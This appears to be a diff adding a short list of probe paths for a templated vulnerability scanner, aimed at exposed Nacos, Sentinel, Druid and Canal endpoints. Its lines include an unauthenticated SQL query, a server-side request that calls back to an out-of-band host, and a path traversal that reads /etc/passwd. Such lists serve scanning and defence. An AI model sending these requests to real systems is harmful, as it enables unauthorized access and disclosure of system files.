@@ -1,0 +1,6 @@
+/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
+/registry/machine?app={{rand_base(5)}}&appType=0&version=0&hostname={{rand_base(5)}}&ip={{interactsh-url}}&port=0
+/druid/index.html
+/fetchBody?id=1/../../../../../../../../etc/passwd
+/api/v1/canal/config/1/1
+/
